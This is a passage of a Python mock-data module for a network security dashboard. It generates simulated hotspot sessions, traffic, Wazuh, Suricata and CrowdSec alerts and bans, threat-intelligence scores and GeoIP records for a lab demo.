                 "uptime": "0h 45m", "idle": "2m", "bytes_in": 198_765, "bytes_out": 43_210, "session_time_left": "3h 15m", "status": "registered"},
                {"id": "sess-003", "user": "juan.perez", "address": "192.168.88.10", "mac": "52:54:00:AA:BB:01",
                 "uptime": "4h 12m", "idle": "0s", "bytes_in": 1_234_567, "bytes_out": 456_789, "session_time_left": "7h 48m", "status": "registered"},
                {"id": "sess-004", "user": "",           "address": "192.168.88.100","mac": "52:54:00:EE:EE:EE",
                 "uptime": "0h 05m", "idle": "0s", "bytes_in": 12_345, "bytes_out": 4_567, "session_time_left": "0h 55m", "status": "unregistered"},
            ]

        @staticmethod
        def session_history(limit: int = 20) -> list[dict]:
            history = []
            users = ["alumno01", "alumno02", "juan.perez", "maria.garcia", "", "alumno01"]
            for i, user in enumerate(users[:limit]):
                history.append({
                    "id": f"hist-{i:03d}",
                    "user": user or "(no registrado)",
                    "address": _LAB_HOSTS[i % len(_LAB_HOSTS)]["ip"],
                    "mac": _LAB_HOSTS[i % len(_LAB_HOSTS)]["mac"],
                    "from": _ts((i + 1) * 60),
                    "till": _ts(i * 60),
                    "uptime": f"{(i % 4) + 1}h {(i * 7) % 60}m",
                    "bytes_in": (i + 1) * 100_000,
                    "bytes_out": (i + 1) * 30_000,
                })
            return history

        @staticmethod
        def realtime_stats() -> dict:
            sessions = MockData.portal.active_sessions()
            total_in  = sum(s["bytes_in"]  for s in sessions)
            total_out = sum(s["bytes_out"] for s in sessions)
            return {
                "active_sessions": len(sessions),
                "registered_sessions": 3,
                "unregistered_sessions": 1,
                "total_bytes_in": total_in,
                "total_bytes_out": total_out,
                "peak_sessions_today": 12,
                "hotspot_initialized": True,
            }

        @staticmethod
        def summary_stats() -> dict:
            return {
                "total_unique_users": 23,
                "sessions_today": 15,
                "sessions_this_week": 87,
                "top_users": [
                    {"user": "juan.perez", "session_count": 5, "total_bytes_in": 5_678_901},
                    {"user": "maria.garcia", "session_count": 4, "total_bytes_in": 3_456_789},
                    {"user": "alumno01", "session_count": 12, "total_bytes_in": 1_234_567},
                ],
                "heatmap": [
                    {"hour": h, "day": d, "count": _rng.randint(0, 8)}
                    for d in range(7) for h in range(24)
                ],
                "hotspot_initialized": True,
            }

        @staticmethod
        def hotspot_config() -> dict:
            return {
                "hotspot_initialized": True,
                "server": {"name": "hotspot1", "interface": "hotspot1", "address_pool": "hs-pool-1"},
                "profile": {"name": "hsprof1", "login_by": "http chap", "use_radius": False},
                "dns_name": "hotspot.facultad.local",
            }

        @staticmethod
        def hotspot_status() -> dict:
            return {"hotspot_initialized": True, "server_name": "hotspot1", "interface": "hotspot1"}

        @staticmethod
        def schedule() -> dict:
            return {
                "enabled": False,
                "allowed_hours": {"hour_from": 7, "hour_to": 22},
                "blocked_days": ["saturday", "sunday"],
                "scope": "unregistered",
            }

        @staticmethod
        def setup_result() -> dict:
            return {
                "success": True,
                "message": "Hotspot inicializado en modo demo. No se realizaron cambios en el MikroTik real.",
                "mock": True,
                "steps": [
                    {"step": "ip_pool",     "status": "ok", "detail": "Pool hs-pool-1 (demo)"},
                    {"step": "profile",     "status": "ok", "detail": "Perfil hsprof1 (demo)"},
                    {"step": "server",      "status": "ok", "detail": "Servidor hotspot1 (demo)"},
                    {"step": "users",       "status": "ok", "detail": "Usuarios default cargados (demo)"},
                ],
            }

        @staticmethod
        def session_chart() -> list[dict]:
            result = []
            for i in range(30):
                t = _NOW - timedelta(minutes=(30 - i) * 2)
                base = 3
                spike = 2 if i in (10, 20) else 0
                result.append({
                    "timestamp": t.isoformat(), 
                    "registered": base + spike,
                    "unregistered": _rng.randint(0, 2)
                })
            return result

    # ── WebSocket generators (dynamic, tick-based) ────────────────────────────

    class websocket:

        @staticmethod
        def traffic_tick(tick: int) -> dict:
            """Generate traffic data. ±10% variation, spike at tick % 30 == 0."""
            _r = _random_module.Random(tick)
            base_interfaces = [
                ("ether1",  5_200_000, 2_100_000),
                ("ether2",  3_100_000, 1_800_000),
                ("ether3",  1_400_000,   900_000),
                ("ether4",    800_000,   200_000),
                ("vlan10",  4_200_000, 1_800_000),
                ("vlan20",  1_100_000,   500_000),
            ]
            spike = tick % 30 == 0
            interfaces = []
            for name, rx_base, tx_base in base_interfaces:
                factor = 2.5 if spike else 1.0
                jitter = _r.uniform(0.9, 1.1)
                interfaces.append({
                    "interface": name,
                    "rx_bps": int(rx_base * factor * jitter),
                    "tx_bps": int(tx_base * factor * jitter),
                    "status": "ok",
                })
            return {"tick": tick, "timestamp": datetime.now(timezone.utc).isoformat(), "interfaces": interfaces}

        @staticmethod
        def vlan_traffic_tick(tick: int) -> dict:
            """Generate VLAN traffic with simulated alert correlation.

            Ciclo de 40 ticks (~80 segundos a 2s/tick):
              ticks  0-9  → todo OK
              ticks 10-24 → vlan10 en ALERT (simula brute-force desde 10.10.10.15)
              ticks 25-29 → todo OK
              ticks 30-36 → vlan30 en ALERT (simula port-scan desde 10.10.30.5)
              ticks 37-39 → todo OK
            """
            _r = _random_module.Random(tick + 1000)
            phase = tick % 40  # ciclo de 40 ticks

            # Determinar qué VLANs están en alerta según la fase del ciclo
            vlan10_alert = 10 <= phase <= 24
            vlan30_alert = 30 <= phase <= 36

            vlans_def = [
                (10, "vlan10", 4_200_000, 1_800_000, vlan10_alert),
                (20, "vlan20", 1_100_000,   500_000, False),
                (30, "vlan30",   850_000,   200_000, vlan30_alert),
                (99, "vlan99",         0,         0, False),
            ]
            result = []
            for vid, name, rx_base, tx_base, is_alert in vlans_def:
                jitter = _r.uniform(0.88, 1.12) if rx_base > 0 else 1.0
                # En alerta: spike de tráfico de +30% para hacerlo más visible
                traffic_factor = 1.3 if is_alert else 1.0
                status = "alert" if is_alert else ("inactive" if rx_base == 0 else "ok")
                result.append({
                    "vlan_id": vid,
                    "name": name,
                    "rx_bps": int(rx_base * jitter * traffic_factor),
                    "tx_bps": int(tx_base * jitter * traffic_factor),
                    "status": status,
                })
            return {"tick": tick, "timestamp": datetime.now(timezone.utc).isoformat(), "vlans": result}

        @staticmethod
        def alerts_tick(tick: int) -> dict | None:
            """Emit a Wazuh alert every ~5 ticks (25s)."""
            if tick % 5 != 0:
                return None
            alerts = MockData.wazuh.alerts(limit=20)
            idx = (tick // 5) % len(alerts)
            alert = dict(alerts[idx])
            alert["id"] = f"ws-{tick:05d}"
            alert["timestamp"] = datetime.now(timezone.utc).isoformat()
            return alert

        @staticmethod
        def security_alert(tick: int) -> dict | None:
            """Emit a security notification every ~9 ticks (~45s).
            Returns a full SecurityNotification-compatible dict:
            type, level, title, detail, actions, data — matching the
            TypeScript SecurityNotification interface on the frontend.
            """
            if tick % 9 != 0:
                return None
            _r = _random_module.Random(tick)
            options = [
                {
                    "type": "wazuh_alert",
                    "level": "critical",
                    "title": f"Brute-force detectado: {_ATTACKERS[0]['ip']}",
                    "detail": "12 intentos fallidos de autenticación SSH en 2 minutos",
                    "actions": ["block_ip", "dismiss"],
                    "data": {"src_ip": _ATTACKERS[0]["ip"], "rule_level": 12,
                             "agent_name": "lubuntu_desk_1"},
                },
                {
                    "type": "wazuh_alert",
                    "level": "high",
                    "title": "Spike de alertas: 12 eventos en 1 minuto",
                    "detail": "Actividad anómala en wazuh-manager — posible escaneo de red",
                    "actions": ["dismiss"],
                    "data": {"src_ip": "", "rule_level": 9, "agent_name": "wazuh-manager"},
                },
                {
                    "type": "phishing_detected",
                    "level": "high",
                    "title": f"Phishing detectado: {_ATTACKERS[2]['ip']}",
                    "detail": "Acceso a dominio sinkhole: malware-c2.example.com",
                    "actions": ["block_ip", "sinkhole_domain", "dismiss"],
                    "data": {"src_ip": _ATTACKERS[2]["ip"], "rule_level": 10,
                             "dst_url": "malware-c2.example.com",
                             "agent_name": "lubuntu_desk_2"},
                },
            ]
            return _r.choice(options)

        @staticmethod
        def portal_session(tick: int) -> dict:
            """Return portal session snapshot. ±1 session every 15 ticks."""
            sessions = MockData.portal.active_sessions()
            chart_history = MockData.portal.session_chart()
            if tick % 15 == 0:
                count = len(sessions) + 1
            elif tick % 15 == 7:
                count = max(1, len(sessions) - 1)
            else:
                count = len(sessions)
            return {
                "tick": tick,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "active_sessions": count,
                "sessions": sessions[:count],
                "chart_history": chart_history,
            }

        @staticmethod
        def crowdsec_decision_tick(tick: int) -> dict | None:
            """Emit a new CrowdSec decision every ~6 ticks (60s at 10s/poll).
            Simulates real-time decisions arriving from the community feed.
            """
            if tick % 6 != 0:
                return None
            _r = _random_module.Random(tick + 9999)
            scenarios = ["crowdsecurity/ssh-bf", "crowdsecurity/port-scan", "crowdsecurity/http-crawl"]
            countries = ["CN", "RU", "BR", "US", "KR"]
            origins = ["crowdsec", "cscli", "console"]
            # new IP each tick (different from existing decisions to simulate stream)
            octets = [_r.randint(1, 254) for _ in range(4)]
            ip = ".".join(str(o) for o in octets)
            scenario = _r.choice(scenarios)
            return {
                "id": str(10000 + tick),
                "ip": ip,
                "type": "ban",
                "duration": "24h",
                "reason": scenario,
                "origin": _r.choice(origins),
                "scenario": scenario,
                "country": _r.choice(countries),
                "as_name": f"AS{_r.randint(1000, 65000)} Mock ISP",
                "expires_at": (_NOW + timedelta(hours=24)).isoformat(),
                "community_score": _r.randint(50, 99),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "is_new": True,
            }

        @staticmethod
        def suricata_alert_tick(tick: int) -> dict | None:
            """Emit a Suricata alert every ~4 ticks (~20s at 5s/tick).
            Rotates through the alert pool with a fresh timestamp.
            Returns None on non-emitting ticks.
            """
            if tick % 4 != 0:
                return None
            alerts_pool = _SURICATA_ALERTS
            idx = (tick // 4) % len(alerts_pool)
            alert = dict(alerts_pool[idx])
            alert["id"] = f"ws-sur-{tick:05d}"
            alert["timestamp"] = datetime.now(timezone.utc).isoformat()
            return alert


# ── CrowdSec Mock Data ────────────────────────────────────────────────────────

# These IPs are shared with MikroTik and Wazuh mock data for cross-service coherence.
# 203.0.113.45  → MikroTik Blacklist_Automatica + Wazuh brute-force + CrowdSec ban
# 198.51.100.22 → MikroTik Blacklist_Automatica + Wazuh port-scan + CrowdSec ban
# 45.142.212.100 → CrowdSec ban ONLY (intentionally missing from MikroTik for sync demo)

_CROWDSEC_DECISIONS = [
    {
        "id": "cs-1",
        "ip": "203.0.113.45",
        "type": "ban",
        "duration": "24h",
        "reason": "crowdsecurity/ssh-bf",
        "origin": "crowdsec",
        "scenario": "crowdsecurity/ssh-bf",
        "country": "CN",
        "as_name": "AS4134 Chinanet",
        "expires_at": (_NOW + timedelta(hours=23, minutes=45)).isoformat(),
        "community_score": 95,
        "reported_by": 1250,
        "is_known_attacker": True,
    },
    {
        "id": "cs-2",
        "ip": "198.51.100.22",
        "type": "ban",
        "duration": "48h",
        "reason": "crowdsecurity/port-scan",
        "origin": "crowdsec",
        "scenario": "crowdsecurity/port-scan",
        "country": "RU",
        "as_name": "AS8359 MTS PJSC",
        "expires_at": (_NOW + timedelta(hours=47)).isoformat(),
        "community_score": 87,
        "reported_by": 890,
        "is_known_attacker": True,
    },
    {
        "id": "cs-3",
        "ip": "185.220.101.50",
        "type": "ban",
        "duration": "7d",
        "reason": "crowdsecurity/http-probing",
        "origin": "cscli",
        "scenario": "crowdsecurity/http-probing",
        "country": "DE",
        "as_name": "AS60729 Tor Exit Node",
        "expires_at": (_NOW + timedelta(days=6, hours=22)).isoformat(),
        "community_score": 92,
        "reported_by": 2100,
        "is_known_attacker": True,
    },
    {
        "id": "cs-4",
        "ip": "45.142.212.100",
        "type": "ban",
        "duration": "24h",
        "reason": "crowdsecurity/wordpress-bf",
        "origin": "crowdsec",
        "scenario": "crowdsecurity/wordpress-bf",
        "country": "NL",
        "as_name": "AS206728 Media Land LLC",
        "expires_at": (_NOW + timedelta(hours=18)).isoformat(),
        "community_score": 78,
        "reported_by": 430,
        "is_known_attacker": True,
    },
    {
        "id": "cs-5",
        "ip": "91.108.56.130",
        "type": "captcha",
        "duration": "1h",
        "reason": "crowdsecurity/http-crawl",
        "origin": "crowdsec",
        "scenario": "crowdsecurity/http-crawl",
        "country": "UA",
        "as_name": "AS57024 Aeroflot Digital",
        "expires_at": (_NOW + timedelta(minutes=45)).isoformat(),
        "community_score": 45,
        "reported_by": 120,
        "is_known_attacker": False,
    },
    {
        "id": "cs-6",
        "ip": "177.21.52.88",
        "type": "ban",
        "duration": "48h",
        "reason": "crowdsecurity/iptables-scan-multi_ports",
        "origin": "crowdsec",
        "scenario": "crowdsecurity/iptables-scan-multi_ports",
        "country": "BR",
        "as_name": "AS27699 TELEFÔNICA BRASIL",
        "expires_at": (_NOW + timedelta(hours=36)).isoformat(),
        "community_score": 65,
        "reported_by": 210,
        "is_known_attacker": False,
    },
    {
        "id": "cs-7",
        "ip": "5.188.206.45",
        "type": "ban",
        "duration": "12h",
        "reason": "crowdsecurity/ssh-bf",
        "origin": "console",
        "scenario": "crowdsecurity/ssh-bf",
        "country": "RU",
        "as_name": "AS35470 Serverius LLC",
        "expires_at": (_NOW + timedelta(hours=8)).isoformat(),
        "community_score": 83,
        "reported_by": 670,
        "is_known_attacker": True,
    },
    {
        "id": "cs-8",
        "ip": "103.45.67.209",
        "type": "ban",
        "duration": "24h",
        "reason": "crowdsecurity/http-probing",
        "origin": "crowdsec",
        "scenario": "crowdsecurity/http-probing",
        "country": "IN",
        "as_name": "AS38266 Vodafone India",
        "expires_at": (_NOW + timedelta(hours=20)).isoformat(),
        "community_score": 58,
        "reported_by": 180,
        "is_known_attacker": False,
    },
]

_CROWDSEC_ALERTS = [
    {
        "id": "alert-001",
        "scenario": "crowdsecurity/ssh-bf",
        "message": "SSH Brute Force: 45 failed attempts in 5 minutes from 203.0.113.45",
        "events_count": 45,
        "start_at": _ts(15),
        "stop_at": _ts(10),
        "source_ip": "203.0.113.45",
        "source_country": "CN",
        "source_as_name": "AS4134 Chinanet",
        "decisions": [{"type": "ban", "duration": "24h", "scope": "ip", "value": "203.0.113.45"}],
        "target_agent": "lubuntu_desk_1",
        "target_ip": "192.168.88.10",
    },
    {
        "id": "alert-002",
        "scenario": "crowdsecurity/port-scan",
        "message": "Massive port scan: 200 ports probed from 198.51.100.22",
        "events_count": 200,
        "start_at": _ts(30),
        "stop_at": _ts(25),
        "source_ip": "198.51.100.22",
        "source_country": "RU",
        "source_as_name": "AS8359 MTS PJSC",
        "decisions": [{"type": "ban", "duration": "48h", "scope": "ip", "value": "198.51.100.22"}],
        "target_agent": "wazuh-server",
        "target_ip": "192.168.88.50",
    },
    {
        "id": "alert-003",
        "scenario": "crowdsecurity/http-crawl",
        "message": "HTTP Crawling: 500 requests in 1 minute",
        "events_count": 500,
        "start_at": _ts(45),
        "stop_at": _ts(40),
        "source_ip": "91.108.56.130",
        "source_country": "UA",
        "source_as_name": "AS57024 Aeroflot Digital",
        "decisions": [{"type": "captcha", "duration": "1h", "scope": "ip", "value": "91.108.56.130"}],
        "target_agent": None,
        "target_ip": None,
    },
    {
        "id": "alert-004",
        "scenario": "crowdsecurity/wordpress-bf",
        "message": "WordPress Brute Force: 300 login attempts",
        "events_count": 300,
        "start_at": _ts(60),
        "stop_at": _ts(50),
        "source_ip": "45.142.212.100",
        "source_country": "NL",
        "source_as_name": "AS206728 Media Land LLC",
        "decisions": [{"type": "ban", "duration": "24h", "scope": "ip", "value": "45.142.212.100"}],
        "target_agent": None,
        "target_ip": None,
    },
    {
        "id": "alert-005",
        "scenario": "crowdsecurity/http-probing",
        "message": "HTTP probing: vulnerability scanner detected",
        "events_count": 85,
        "start_at": _ts(75),
        "stop_at": _ts(70),
        "source_ip": "185.220.101.50",
        "source_country": "DE",
        "source_as_name": "AS60729 Tor Exit Node",
        "decisions": [{"type": "ban", "duration": "7d", "scope": "ip", "value": "185.220.101.50"}],
        "target_agent": None,
        "target_ip": None,
    },
    {
        "id": "alert-006",
        "scenario": "crowdsecurity/iptables-scan-multi_ports",
        "message": "Multi-port scan: 50 ports probed in 30 seconds",
        "events_count": 50,
        "start_at": _ts(90),
        "stop_at": _ts(85),
        "source_ip": "177.21.52.88",
        "source_country": "BR",
        "source_as_name": "AS27699 TELEFÔNICA BRASIL",
        "decisions": [{"type": "ban", "duration": "48h", "scope": "ip", "value": "177.21.52.88"}],
        "target_agent": None,
        "target_ip": None,
    },
    {
        "id": "alert-007",
        "scenario": "crowdsecurity/ssh-bf",
        "message": "SSH Brute Force: 22 failed attempts from 5.188.206.45",
        "events_count": 22,
        "start_at": _ts(100),
        "stop_at": _ts(95),
        "source_ip": "5.188.206.45",
        "source_country": "RU",
        "source_as_name": "AS35470 Serverius LLC",
        "decisions": [{"type": "ban", "duration": "12h", "scope": "ip", "value": "5.188.206.45"}],
        "target_agent": "lubuntu_desk_2",
        "target_ip": "192.168.88.11",
    },
    {
        "id": "alert-008",
        "scenario": "crowdsecurity/http-probing",
        "message": "HTTP probing — low severity scanner",
        "events_count": 30,
        "start_at": _ts(110),
        "stop_at": _ts(105),
        "source_ip": "103.45.67.209",
        "source_country": "IN",
        "source_as_name": "AS38266 Vodafone India",
        "decisions": [{"type": "ban", "duration": "24h", "scope": "ip", "value": "103.45.67.209"}],
        "target_agent": None,
        "target_ip": None,
    },
    {
        "id": "alert-009",
        "scenario": "crowdsecurity/ssh-bf",
        "message": "SSH Brute Force: 15 attempts — low activity threshold",
        "events_count": 15,
        "start_at": _ts(120),
        "stop_at": _ts(115),
        "source_ip": "203.0.113.45",
        "source_country": "CN",
        "source_as_name": "AS4134 Chinanet",
        "decisions": [],
        "target_agent": "lubuntu_desk_1",
        "target_ip": "192.168.88.10",
    },
    {
        "id": "alert-010",
        "scenario": "crowdsecurity/wordpress-bf",
        "message": "WordPress login attempt — single IP repeated",
        "events_count": 12,
        "start_at": _ts(130),
        "stop_at": _ts(128),
        "source_ip": "91.108.56.130",
        "source_country": "UA",
        "source_as_name": "AS57024 Aeroflot Digital",
        "decisions": [],
        "target_agent": None,
        "target_ip": None,
    },
]

_CROWDSEC_SCENARIOS = [
    {
        "name": "crowdsecurity/ssh-bf",
        "description": "Detect SSH brute force attacks (failed authentication attempts)",
        "alerts_count": 45,
        "last_triggered": _ts(10),
        "trend": "up",
    },
    {
        "name": "crowdsecurity/port-scan",
        "description": "Detect TCP port scanning activity",
        "alerts_count": 23,
        "last_triggered": _ts(25),
        "trend": "stable",
    },
    {
        "name": "crowdsecurity/http-crawl",
        "description": "Detect aggressive HTTP crawling / scraping behavior",
        "alerts_count": 12,
        "last_triggered": _ts(40),
        "trend": "down",
    },
    {
        "name": "crowdsecurity/wordpress-bf",
        "description": "Detect WordPress wp-login.php brute force attacks",
        "alerts_count": 8,
        "last_triggered": _ts(50),
        "trend": "up",
    },
    {
        "name": "crowdsecurity/http-probing",
        "description": "Detect vulnerability probing via HTTP requests",
        "alerts_count": 5,
        "last_triggered": _ts(70),
        "trend": "stable",
    },
    {
        "name": "crowdsecurity/iptables-scan-multi_ports",
        "description": "Detect multi-port scans using iptables logs",
        "alerts_count": 3,
        "last_triggered": _ts(85),
        "trend": "down",
    },
]

_CROWDSEC_BOUNCERS = [
    {
        "name": "cs-firewall-bouncer",
        "ip_address": "127.0.0.1",
        "type": "firewall",
        "version": "v0.0.28",
        "last_pull": _ts(2),
        "created_at": _ts(15 * 24 * 60),
        "status": "connected",
    },
    {
        "name": "cs-nginx-bouncer",
        "ip_address": "127.0.0.1",
        "type": "web",
        "version": "v1.0.5",
        "last_pull": _ts(180),
        "created_at": _ts(10 * 24 * 60),
        "status": "disconnected",
    },
]

_CROWDSEC_MACHINES = [
    {
        "name": "netshield-lab",
        "version": "v1.6.3",
        "status": "validated",
        "last_push": _ts(5),
        "created_at": _ts(15 * 24 * 60),
        "info": "Main CrowdSec agent for the NetShield lab environment",
    },
]

_CROWDSEC_CTI = {
    "203.0.113.45": {"community_score": 95, "is_known_attacker": True, "reported_by": 1250,
                     "background_noise": False, "classifications": ["bruteforce", "credential-stuffing"]},
    "198.51.100.22": {"community_score": 87, "is_known_attacker": True, "reported_by": 890,
                      "background_noise": False, "classifications": ["scanner"]},
    "185.220.101.50": {"community_score": 92, "is_known_attacker": True, "reported_by": 2100,
                       "background_noise": True, "classifications": ["tor-exit-node", "scanner"]},
    "45.142.212.100": {"community_score": 78, "is_known_attacker": True, "reported_by": 430,
                       "background_noise": False, "classifications": ["bruteforce"]},
    "91.108.56.130":  {"community_score": 45, "is_known_attacker": False, "reported_by": 120,
                       "background_noise": False, "classifications": ["crawler"]},
    "192.168.88.10":  {"community_score": 0, "is_known_attacker": False, "reported_by": 0,
                       "background_noise": False, "classifications": []},
    "192.168.88.11":  {"community_score": 0, "is_known_attacker": False, "reported_by": 0,
                       "background_noise": False, "classifications": []},
}


class _CrowdSecMockData:
    """CrowdSec mock data namespace, attached as MockData.crowdsec."""

    @staticmethod
    def decisions() -> list[dict]:
        """[CrowdSec API] GET /v1/decisions — active bans and captchas."""
        return [dict(d) for d in _CROWDSEC_DECISIONS]

    @staticmethod
    def decisions_stream(startup: bool = False) -> dict:
        """[CrowdSec API] GET /v1/decisions/stream — new decisions since last pull."""
        if startup:
            return {"new": _CROWDSEC_DECISIONS[:3], "deleted": []}
        return {"new": [], "deleted": []}

    @staticmethod
    def alerts(
        limit: int = 50,
        scenario: str | None = None,
        ip: str | None = None,
    ) -> list[dict]:
        """[CrowdSec API] GET /v1/alerts — alerts detected by the local agent."""
        result = [dict(a) for a in _CROWDSEC_ALERTS]
        if scenario:
            result = [a for a in result if scenario.lower() in a["scenario"].lower()]
        if ip:
            result = [a for a in result if a["source_ip"] == ip]
        return result[:limit]

    @staticmethod
    def alert_detail(alert_id: str) -> dict | None:
        """[CrowdSec API] GET /v1/alerts/{id} — full alert with all events."""
        base = next((dict(a) for a in _CROWDSEC_ALERTS if a["id"] == alert_id), None)
        if base:
            # Add synthetic events list for detail view
            base["events"] = [
                {
                    "timestamp": _ts(i),
                    "meta": [{"key": "source_ip", "value": base["source_ip"]},
                              {"key": "http_path", "value": f"/wp-login.php?attempt={i}"}],
                }
                for i in range(min(base["events_count"], 10))
            ]
        return base

    @staticmethod
    def bouncers() -> list[dict]:
        """[CrowdSec API] GET /v1/bouncers — registered bouncers."""
        return [dict(b) for b in _CROWDSEC_BOUNCERS]

    @staticmethod
    def machines() -> list[dict]:
        """[CrowdSec API] GET /v1/machines — registered agents."""
        return [dict(m) for m in _CROWDSEC_MACHINES]

    @staticmethod
    def scenarios() -> list[dict]:
        """[CrowdSec API] Derived from GET /v1/alerts — active detection scenarios."""
        return [dict(s) for s in _CROWDSEC_SCENARIOS]

    @staticmethod
    def metrics() -> dict:
        """[CrowdSec API] Computed from /v1/alerts + /v1/decisions."""
        _r = _random_module.Random(42)
        decisions_per_hour = []
        for i in range(24):
            t = _NOW - timedelta(hours=24 - i)
            base = _r.randint(0, 3)
            spike = 8 if i in (2, 14, 21) else 0
            decisions_per_hour.append({
                "hour": t.strftime("%Y-%m-%dT%H:00:00"),
                "count": base + spike,
            })
        return {
            "active_decisions": len(_CROWDSEC_DECISIONS),
            "alerts_24h": 47,
            "scenarios_active": len(_CROWDSEC_SCENARIOS),
            "bouncers_connected": sum(1 for b in _CROWDSEC_BOUNCERS if b["status"] == "connected"),
            "top_countries": [
                {"country": "CN", "code": "CN", "count": 18, "pct": 35},
                {"country": "Russia", "code": "RU", "count": 14, "pct": 28},
                {"country": "United States", "code": "US", "count": 8, "pct": 15},
                {"country": "Brazil", "code": "BR", "count": 5, "pct": 10},
                {"country": "Netherlands", "code": "NL", "count": 4, "pct": 8},
                {"country": "Germany", "code": "DE", "count": 2, "pct": 4},
            ],
            "top_scenario": {"name": "crowdsecurity/ssh-bf", "count": 45},
            "decisions_per_hour": decisions_per_hour,
        }

    @staticmethod
    def cti_ip(ip: str) -> dict:
        """[CrowdSec CTI] Community threat intelligence score for an IP."""
        return _CROWDSEC_CTI.get(ip, {
            "community_score": 0,
            "is_known_attacker": False,
            "reported_by": 0,
            "background_noise": False,
            "classifications": [],
        })

    @staticmethod
    def sync_status() -> dict:
        """Compare CrowdSec active decisions with MikroTik Blacklist_Automatica.

        Intentionally 45.142.212.100 is only in CrowdSec (not in MikroTik)
        to demonstrate the sync workflow in demo mode.
        """
        crowdsec_ips = {d["ip"] for d in _CROWDSEC_DECISIONS if d["type"] == "ban"}
        # MikroTik Blacklist_Automatica from mock_data
        mikrotik_ips = {"203.0.113.45", "198.51.100.22"}
        only_crowdsec = sorted(crowdsec_ips - mikrotik_ips)
        only_mikrotik = sorted(mikrotik_ips - crowdsec_ips)
        synced = sorted(crowdsec_ips & mikrotik_ips)
        return {
            "in_sync": len(only_crowdsec) == 0 and len(only_mikrotik) == 0,
            "only_in_crowdsec": only_crowdsec,
            "only_in_mikrotik": only_mikrotik,
            "synced_ips": synced,
            "synced_count": len(synced),
            "total_crowdsec": len(crowdsec_ips),
            "total_mikrotik": len(mikrotik_ips),
        }

    @staticmethod
    def hub() -> dict:
        """[CrowdSec Hub] Installed collections and their status."""
        return {
            "collections": [
                {"name": "crowdsecurity/linux", "status": "up-to-date", "version": "0.2"},
                {"name": "crowdsecurity/nginx", "status": "up-to-date", "version": "0.1"},
                {"name": "crowdsecurity/wordpress", "status": "up-to-date", "version": "0.1"},
                {"name": "crowdsecurity/ssh-bf", "status": "up-to-date", "version": "2.1"},
            ],
            "parsers": [
                {"name": "crowdsecurity/sshd-logs", "status": "enabled", "version": "2.3"},
                {"name": "crowdsecurity/nginx-logs", "status": "enabled", "version": "1.0"},
                {"name": "crowdsecurity/iptables-logs", "status": "enabled", "version": "1.0"},
            ],
            "last_update": _ts(60),
        }

    @staticmethod
    def ip_context(ip: str) -> dict:
        """Unified IP profile combining CrowdSec + MikroTik + Wazuh data."""
        decisions = [d for d in _CROWDSEC_DECISIONS if d["ip"] == ip]
        alerts = [a for a in _CROWDSEC_ALERTS if a["source_ip"] == ip]
        cti = _CrowdSecMockData.cti_ip(ip)

        # MikroTik data
        mt_blacklist_ips = {"203.0.113.45", "198.51.100.22"}
        mt_arp = next(
            (h for h in _LAB_HOSTS if h["ip"] == ip), None
        )

        # Wazuh data
        from services.mock_data import MockData as _md
        wazuh_alerts = [
            a for a in MockData.wazuh.alerts(limit=100)
            if a.get("src_ip") == ip or a.get("agent_ip") == ip
        ]
        affected_agents = list({a["agent_name"] for a in wazuh_alerts})

        return {
            "ip": ip,
            "crowdsec": {
                "decisions": decisions,
                "alerts": alerts[:5],
                "community_score": cti["community_score"],
                "is_known_attacker": cti["is_known_attacker"],
                "reported_by": cti["reported_by"],
                "background_noise": cti["background_noise"],
                "classifications": cti["classifications"],
                "country": decisions[0]["country"] if decisions else "",
                "as_name": decisions[0]["as_name"] if decisions else "",
            },
            "mikrotik": {
                "in_arp": mt_arp is not None,
                "arp_comment": mt_arp["name"] if mt_arp else None,
                "in_blacklist": ip in mt_blacklist_ips,
                "firewall_rules": [],
            },
            "wazuh": {
                "alerts_count": len(wazuh_alerts),
                "last_alert": wazuh_alerts[0] if wazuh_alerts else None,
                "agents_affected": affected_agents,
            },
        }


# Attach as class-level attribute so usage is MockData.crowdsec.decisions()
MockData.crowdsec = _CrowdSecMockData



# ── GeoIP Mock Data ───────────────────────────────────────────────────────────
#
# Datos coherentes con las IPs de CrowdSec, Wazuh y MikroTik.
# IPs locales → country_code="LOCAL".

_GEOIP_DATA: dict[str, dict] = {
    "203.0.113.45": {
        "country_code": "CN", "country_name": "China",
        "city": "Beijing", "latitude": 39.9042, "longitude": 116.4074,
        "asn": 4134, "as_name": "AS4134 Chinanet",
        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
    },
    "198.51.100.22": {
        "country_code": "RU", "country_name": "Russia",
        "city": "Moscow", "latitude": 55.7558, "longitude": 37.6173,
        "asn": 8359, "as_name": "AS8359 MTS PJSC",
        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
    },
    "185.220.101.50": {
        "country_code": "DE", "country_name": "Germany",
        "city": "Frankfurt", "latitude": 50.1109, "longitude": 8.6821,
        "asn": 60729, "as_name": "AS60729 Tor Exit Node",
        "network_type": "Hosting", "is_datacenter": True, "is_tor": True,
    },
    "45.142.212.100": {
        "country_code": "NL", "country_name": "Netherlands",
        "city": "Amsterdam", "latitude": 52.3676, "longitude": 4.9041,
        "asn": 206728, "as_name": "AS206728 Media Land LLC",
        "network_type": "Hosting", "is_datacenter": True, "is_tor": False,
    },
    "91.108.56.130": {
        "country_code": "UA", "country_name": "Ukraine",
        "city": "Kyiv", "latitude": 50.4501, "longitude": 30.5234,
        "asn": 57024, "as_name": "AS57024 Aeroflot Digital",
        "network_type": "Business", "is_datacenter": False, "is_tor": False,
    },
    "177.21.52.88": {
        "country_code": "BR", "country_name": "Brazil",
        "city": "Sao Paulo", "latitude": -23.5505, "longitude": -46.6333,
        "asn": 27699, "as_name": "AS27699 TELEFONICA BRASIL",
        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
    },
    "5.188.206.45": {
        "country_code": "RU", "country_name": "Russia",
        "city": "Saint Petersburg", "latitude": 59.9311, "longitude": 30.3609,
        "asn": 35470, "as_name": "AS35470 Serverius LLC",
        "network_type": "Hosting", "is_datacenter": True, "is_tor": False,
    },
    "103.45.67.209": {
        "country_code": "IN", "country_name": "India",
        "city": "Mumbai", "latitude": 19.0760, "longitude": 72.8777,
        "asn": 38266, "as_name": "AS38266 Vodafone India",
        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
    },
    "203.0.113.99": {
        "country_code": "CN", "country_name": "China",
        "city": "Shanghai", "latitude": 31.2304, "longitude": 121.4737,
        "asn": 4812, "as_name": "AS4812 China Telecom",
        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
    },
}

_GEOIP_DEFAULT = {
